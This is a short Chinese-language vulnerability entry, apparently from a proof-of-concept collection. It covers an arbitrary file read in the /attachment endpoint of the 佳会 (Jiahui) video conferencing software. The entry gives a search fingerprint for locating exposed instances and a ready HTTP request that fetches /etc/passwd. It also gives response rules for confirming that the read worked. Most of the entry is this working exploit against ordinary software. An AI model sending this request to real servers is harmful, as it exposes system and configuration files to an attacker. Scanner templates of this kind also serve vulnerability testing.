﻿# 佳会视频会议 attachment 任意文件读取

> 更新时间：2024-05-20

> 漏洞编号：

> 漏洞说明：    佳会视频会议是由杭州叁体网络科技有限公司开发的一款线上视频会议软件，叁体·佳会3.0是业内首家兼容HTML5/WebRTC技术的网络会议产品,无需下载任何客户端与插件，即可开启视频会议，无需下载插件即可分享屏幕,甚至只需要用微信/QQ扫描二维码，就能加入视频会议。

    佳会视频会议/attachment接口存在任意文件读取漏洞，攻击者可以利用漏洞读取服务器上的任意文件，包括配置文件等敏感信息。

> 漏洞特征：body="/user/get_app_scheme?site_id="

> 验证脚本：HTTP

```
GET /attachment?file=/etc/passwd HTTP/1.1
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：佳会视频会议 attachment 任意文件读取.poc

